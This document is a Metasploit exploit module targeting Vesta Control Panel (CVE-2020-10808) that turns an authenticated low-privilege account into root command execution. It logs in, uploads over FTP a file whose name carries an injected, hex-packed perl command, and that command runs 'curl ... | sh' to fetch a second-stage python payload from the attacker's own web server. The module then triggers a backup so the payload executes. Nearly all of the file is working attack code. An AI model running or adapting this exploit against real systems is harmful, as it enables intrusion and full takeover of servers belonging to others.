# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Vesta Control Panel Authenticated Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits command injection vulnerability in v-list-user-backups bash script file.
        Low privileged authenticated users can execute arbitrary commands under the context of the root user.

        An authenticated attacker with a low privileges can inject a payload in the file name starts with dot.
        During the user backup process, this file name will be evaluated by the v-user-backup bash scripts. As
        result of that backup process, when an attacker try to list existing backups injected payload will be
        executed.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/&#039;],
          [&#039;CVE&#039;, &#039;2020-10808&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 8083,
          &#039;WfsDelay&#039; => 300,
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Mar 17 2020",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        Opt::RPORT(8083),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to login with&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable instance&#039;, &#039;/&#039;])
      ]
    )
    deregister_options(&#039;FTPUSER&#039;, &#039;FTPPASS&#039;)
  end

  def username
    datastore[&#039;USERNAME&#039;]
  end

  def password
    datastore[&#039;PASSWORD&#039;]
  end

  def login
    #
    # This is very simple login process. Nothing important.
    # We will be using cookie and csrf_token across the module so that we are global variable.
    #
    print_status(&#039;Retrieving cookie and csrf token values&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;login&#039;, &#039;/&#039;),
    })

    if res && res.code == 200 && !res.get_cookies.empty?
      @cookie = res.get_cookies
      @csrf_token = res.body.scan(/<input type="hidden" name="token" value="(.*)">/).flatten[0] || &#039;&#039;
      if @csrf_token.empty?
        fail_with(Failure::Unknown, &#039;There is no CSRF token at HTTP response.&#039;)
      end
    else
      fail_with(Failure::Unknown, &#039;Something went wrong.&#039;)
    end
    print_good(&#039;Cookie and CSRF token values successfully retrieved&#039;)

    print_status(&#039;Authenticating to HTTP Service with given credentials&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;login&#039;, &#039;/&#039;),
      &#039;cookie&#039; => @cookie,
      &#039;vars_post&#039; => {
        &#039;token&#039;    => @csrf_token,
        &#039;user&#039;     => username,
        &#039;password&#039; => password
      }
    })

    if res && res.code == 302 && !res.get_cookies.empty?
      print_good(&#039;Successfully authenticated to the HTTP Service&#039;)
      @cookie = res.get_cookies
    else
      fail_with(Failure::Unknown, &#039;Credentials are not valid.&#039;)
    end
  end

  def is_scheduled_backup_running
    res = trigger_scheduled_backup
    #
    # MORE explaination.
    #
    if res && res.code == 302
      res = trigger_payload
      if res.body.include?(&#039;An existing backup is already running. Please wait for that backup to finish.&#039;)
        return true
      else
        print_good(&#039;It seems scheduled backup is done ..! Triggerring payload <3&#039;)
        return false
      end
    else
      fail_with(Failure::Unknown, &#039;Something went wrong. Did you get your session ?&#039;)
    end
    return false
  end

  def trigger_payload
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;list&#039;, &#039;backup&#039;, &#039;/&#039;),
    })
    if res && res.code == 200
      res
    else
      fail_with(Failure::Unknown, &#039;Something went wrong. Maybe session timed out ?&#039;)
    end
  end

  def trigger_scheduled_backup
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;schedule&#039;, &#039;backup&#039;, &#039;/&#039;),
    })
    if res && res.code == 302 && res.headers[&#039;Location&#039;] =~ /\/list\/backup\//
      res
    else
      fail_with(Failure::Unknown, &#039;Something went wrong.&#039;)
    end
  end

  def payload_implant
    #
    # Our payload will be placed as a file name on FTP service.
    # Payload lenght can&#039;t be more then 255 and SPACE can&#039;t be used because of the
    # bug in the backend software. Due to these limitations, I used web delivery method.
    #
    # When the initial payload executed. It will execute very short perl command, which is going to fetch
    #
    final_payload = "curl -sSL #{@second_stage_url} | sh".to_s.unpack("H*").first
    p = "perl${IFS}-e${IFS}&#039;system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))&#039;"

    # Yet another datastore variable overriding.
    if datastore[&#039;SSL&#039;]
      ssl_restore = true
      datastore[&#039;SSL&#039;] = false
    end
    port_restore = datastore[&#039;RPORT&#039;]
    datastore[&#039;RPORT&#039;] = 21
    datastore[&#039;FTPUSER&#039;] = username
    datastore[&#039;FTPPASS&#039;] = password

    #
    # Connecting to the FTP service with same creds as web ui.
    # Implanting the very first stage of payload as a empty file.
    #
    if (not connect_login)
      fail_with(Failure::Unknown, &#039;Unable to authenticate to FTP service&#039;)
    end
    print_good(&#039;Successfully authenticated to the FTP service&#039;)

    res = send_cmd_data([&#039;PUT&#039;, ".a&#039;;$(#{p});&#039;"], "")
    if res.nil?
      fail_with(Failure::UnexpectedReply, "Failed to upload the payload to FTP server")
    end
    print_good(&#039;Successfully uploaded the payload as a file name&#039;)
    disconnect

    # Revert datastore variables.
    datastore[&#039;RPORT&#039;] = port_restore
    datastore[&#039;SSL&#039;] = true if ssl_restore
  end

  def exploit
    start_http_server
    payload_implant
    login
    trigger_scheduled_backup
    print_good(&#039;Scheduled backup has ben started. Exploitation may take up to 5 minutes.&#039;)
    while is_scheduled_backup_running == true
      print_status(&#039;It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...&#039;)
      Rex.sleep(30)
    end
    stop_service
  end

  def on_request_uri(cli, request)
    print_good(&#039;First stage is executed ! Sending 2nd stage of the payload&#039;)
    second_stage = "python -c \"#{payload.encoded}\""
    send_response(cli, second_stage, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
  end

  def start_http_server
    #
    # HttpClient and HttpServer use same SSL variable :(
    # We don&#039;t need a SSL for payload delivery.
    #
    if datastore[&#039;SSL&#039;]
      ssl_restore = true
      datastore[&#039;SSL&#039;] = false
    end
    start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => resource_uri
    }})
    print_status("Second payload download URI is #{get_uri}")
    # We need that global variable since get_uri keep using SSL from datastore
    # We have to get the URI before restoring the SSL.
    @second_stage_url = get_uri
    datastore[&#039;SSL&#039;] = true if ssl_restore
  end
end

